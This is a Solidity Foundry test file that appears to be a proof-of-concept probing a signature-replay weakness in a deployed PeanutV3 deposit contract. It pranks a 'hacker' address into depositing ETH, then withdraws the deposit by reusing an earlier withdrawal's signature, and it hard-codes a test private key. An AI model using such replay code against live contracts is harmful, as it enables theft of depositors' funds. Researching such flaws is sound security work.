// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PeanutV3.sol";

contract NutcrackerTest is Test {
    PeanutV3 peanutV3;

    uint256 SIGNER_PRIVATE_KEY = 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6;
    address SIGNER_ADDRESS = 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720;
    bytes SIGNATURE = bytes(hex"3de6a25a8707dbafa7246568fe690a04ae384aae83ab8b007ff78810974757db2e4380533352b9e42e987a20423272efc5d941b92205a93c66e9040bee551a3a1c");

    function setUp() public {
        peanutV3 = PeanutV3(0xdB60C736A30C41D9df0081057Eae73C3eb119895);
    }

    function testWithdrawDeposit() public {
        bytes memory signature = bytes(hex"3de6a25a8707dbafa7246568fe690a04ae384aae83ab8b007ff78810974757db2e4380533352b9e42e987a20423272efc5d941b92205a93c66e9040bee551a3a1c");


        peanutV3.withdrawDeposit(
            78, 
            address(0xAb45507d1db315e8618eA26D78F1C85210077792), 
            bytes32(0x677790e30694f0593afa76b03652171614f27e222783ea585f0742634eb992fb), 
            signature
        );
    }

    function testMakeDeposit() public {
        // address _tokenAddress,
        // uint8 _contractType,
        // uint256 _amount,
        // uint256 _tokenId,
        // address _pubKey20

        address _tokenAddress = address(0); // ETH
        uint8 _contractType = 0; // ether
        uint256 _amount = 1000000000000000000; // 1 ETH
        uint256 _tokenId = 0; // ignored when _contractType == 0
        address _pubKey20 = SIGNER_ADDRESS;

        address hacker = address(0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f);
        vm.prank(hacker);

        bytes32 hash = keccak256(abi.encodePacked(hacker));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PRIVATE_KEY, hash);

        bytes memory signature = abi.encodePacked(v, r, s);
        emit log_bytes(signature);

        uint256 depositId = peanutV3.makeDeposit{value: _amount}(
            _tokenAddress,
            _contractType,
            _amount,
            _tokenId,
            // _pubKey20
            0x01d32A3567Bd95620FEF661D2B88b0F1ce1fB0e6
        );

        emit log_named_uint("depositId", depositId);

        bytes memory signature_original = bytes(hex"3de6a25a8707dbafa7246568fe690a04ae384aae83ab8b007ff78810974757db2e4380533352b9e42e987a20423272efc5d941b92205a93c66e9040bee551a3a1c");

        emit log_named_uint("Balance ", address(0xAb45507d1db315e8618eA26D78F1C85210077792).balance);

        // withdraw
        peanutV3.withdrawDeposit(
            depositId, 
            // hacker, 
            0xAb45507d1db315e8618eA26D78F1C85210077792, 
            0x677790e30694f0593afa76b03652171614f27e222783ea585f0742634eb992fb, 
            // signature
            signature_original
        );

        emit log_named_uint("Balance ", address(0xAb45507d1db315e8618eA26D78F1C85210077792).balance);


    }
}
